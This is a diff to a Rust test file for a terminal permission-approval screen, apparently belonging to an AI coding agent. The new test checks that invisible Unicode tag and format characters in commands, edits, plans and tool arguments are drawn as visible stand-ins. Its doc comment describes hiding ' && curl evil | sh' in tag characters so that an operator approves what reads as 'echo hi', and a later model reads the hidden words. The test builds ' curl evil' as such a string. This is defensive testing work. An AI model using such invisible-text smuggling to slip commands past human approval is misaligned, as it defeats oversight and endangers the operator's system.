@@ -679,32 +679,78 @@ fn screen(app: &mut App, w: u16, h: u16) -> String {
 fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves_it() {
     const CONTROLS: &str = "a\x1b[8mb\x07c\rd";
     const SHOWN: [char; 3] = ['\u{241b}', '\u{2407}', '\u{240d}'];
-    let ask = |tool: &str, input: serde_json::Value, target: Option<String>, action| {
-        with(vec![Event::PermissionRequest {
-            id: "perm".into(),
-            tool: tool.to_owned(),
-            input: input.to_string(),
-            target,
-            proposal: action,
-            reason: None,
-            agent: None,
-        }])
+
+    for (name, mut app) in questions(CONTROLS) {
+        let drawn = screen(&mut app, 120, 50);
+        for glyph in SHOWN {
+            assert!(
+                drawn.contains(glyph),
+                "{name} does not show {glyph:?}:\n{drawn}"
+            );
+        }
+    }
+    for row in saved_rows(CONTROLS) {
+        assert!(row.contains('\u{241b}'), "{row}");
+    }
+}
+
+/// Tag characters and the invisible format characters draw in no cell, and
+/// can spell whole words: `echo hi` with ` && curl evil | sh` written in tags
+/// after it reads as `echo hi`, and a model a written file is later given
+/// reads the words nobody saw. Each is shown as a stand-in where the operator
+/// approves the call; a flag that tags spell is a flag, and is drawn as one.
+#[test]
+fn a_permission_question_shows_where_it_holds_text_that_draws_as_nothing() {
+    let tagged: String = " curl evil"
+        .chars()
+        .map(|c| {
+            char::from_u32(0xe0000 + u32::from(c)).expect("a tag exists for every ASCII character")
+        })
+        .collect();
+    let hidden = format!(
+        "a{tagged}b\u{200b}c\u{2060}d\u{feff}e\u{e0101}f\u{ad}g\u{3164}h{}i",
+        "\u{fe00}\u{fe01}".repeat(8)
+    );
+    let invisible = |c: char| {
+        ('\u{e0000}'..='\u{e007f}').contains(&c)
+            || ('\u{e0100}'..='\u{e01ef}').contains(&c)
+            || ('\u{fe00}'..='\u{fe0d}').contains(&c)
+            || matches!(
+                c,
+                '\u{200b}' | '\u{2060}' | '\u{feff}' | '\u{ad}' | '\u{3164}'
+            )
     };
-    let cases: Vec<(&str, App)> = vec![
-        (
-            "command",
-            ask(
-                "Bash",
-                serde_json::json!({ "command": CONTROLS }),
-                Some(CONTROLS.to_owned()),
-                Some(Proposal::new(
-                    Action::Command {
-                        command: CONTROLS.to_owned(),
-                    },
-                    ["command"],
-                )),
-            ),
-        ),
+
+    for (name, mut app) in questions(&hidden) {
+        let drawn = screen(&mut app, 120, 50);
+        assert!(
+            !drawn.contains(invisible),
+            "{name} draws text no cell shows:\n{drawn}"
+        );
+        assert!(
+            drawn.contains('\u{fffd}'),
+            "{name} does not show where the hidden text was:\n{drawn}"
+        );
+    }
+    for row in saved_rows(&hidden) {
+        assert!(!row.contains(invisible), "{row}");
+    }
+
+    let flag = "\u{1f3f4}\u{e0067}\u{e0062}\u{e0065}\u{e006e}\u{e0067}\u{e007f}";
+    for (name, mut app) in questions(flag) {
+        let drawn = screen(&mut app, 120, 50);
+        assert!(
+            drawn.contains(flag),
+            "{name} does not draw the flag:\n{drawn}"
+        );
+    }
+}
+
+/// A question about a call that holds `text` for each way a question draws
+/// a call: a command, an edit, a file written whole, and by its arguments.
+fn questions(text: &str) -> Vec<(&'static str, App)> {
+    vec![
+        ("command", ask_command(text)),
         (
             "edit",
             ask(
@@ -713,9 +759,9 @@ fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves
                 Some("src/a.rs".to_owned()),
                 Some(Proposal::new(
                     Action::Replace {
-                        path: format!("src/{CONTROLS}.rs"),
-                        old: format!("old {CONTROLS}"),
-                        new: format!("new {CONTROLS}"),
+                        path: format!("src/{text}.rs"),
+                        old: format!("old {text}"),
+                        new: format!("new {text}"),
                         every: false,
                     },
                     ["file_path"],
@@ -731,7 +777,7 @@ fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves
                 Some(Proposal::new(
                     Action::Write {
                         path: "src/a.rs".to_owned(),
-                        content: format!("line {CONTROLS}\nnext"),
+                        content: format!("line {text}\nnext"),
                         existed: Some(false),
                     },
                     ["file_path"],
@@ -742,42 +788,68 @@ fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves
             "arguments",
             ask(
                 "mcp__search__query",
-                serde_json::json!({ "query": CONTROLS, "note": format!("one\n{CONTROLS}") }),
+                serde_json::json!({ "query": text, "note": format!("one\n{text}") }),
                 None,
                 None,
             ),
         ),
-    ];
+        (
+            "plan",
+            ask(
+                "ExitPlanMode",
+                serde_json::json!({ "plan": format!("1. Read {text}") }),
+                None,
+                Some(Proposal::new(
+                    Action::Plan {
+                        plan: format!("1. Read {text}"),
+                    },
+                    ["plan"],
+                )),
+            ),
+        ),
+    ]
+}
 
-    for (name, mut app) in cases {
-        let drawn = screen(&mut app, 120, 50);
-        for glyph in SHOWN {
-            assert!(
-                drawn.contains(glyph),
-                "{name} does not show {glyph:?}:\n{drawn}"
-            );
-        }
-    }
+/// The rows of a question about the command `text` that say which standing
+/// answer would be saved.
+fn saved_rows(text: &str) -> Vec<String> {
+    let drawn = screen(&mut ask_command(text), 120, 50);
+    let saved: Vec<String> = drawn
+        .lines()
+        .filter(|l| l.contains("niobe saves Bash("))
+        .map(str::to_owned)
+        .collect();
+    assert!(!saved.is_empty(), "no row says what is saved:\n{drawn}");
+    saved
+}
 
-    // The standing answer that would be saved, in the row that says so.
-    let mut app = ask(
+fn ask_command(text: &str) -> App {
+    ask(
         "Bash",
-        serde_json::json!({ "command": CONTROLS }),
-        Some(CONTROLS.to_owned()),
+        serde_json::json!({ "command": text }),
+        Some(text.to_owned()),
         Some(Proposal::new(
             Action::Command {
-                command: CONTROLS.to_owned(),
+                command: text.to_owned(),
             },
             ["command"],
         )),
-    );
-    let drawn = screen(&mut app, 120, 50);
-    let saved: Vec<&str> = drawn
-        .lines()
-        .filter(|l| l.contains("niobe saves Bash("))
-        .collect();
-    assert!(!saved.is_empty(), "no row says what is saved:\n{drawn}");
-    for row in saved {
-        assert!(row.contains('\u{241b}'), "{row}");
-    }
+    )
+}
+
+fn ask(
+    tool: &str,
+    input: serde_json::Value,
+    target: Option<String>,
+    proposal: Option<Proposal>,
+) -> App {
+    with(vec![Event::PermissionRequest {
+        id: "perm".into(),
+        tool: tool.to_owned(),
+        input: input.to_string(),
+        target,
+        proposal,
+        reason: None,
+        agent: None,
+    }])
 }
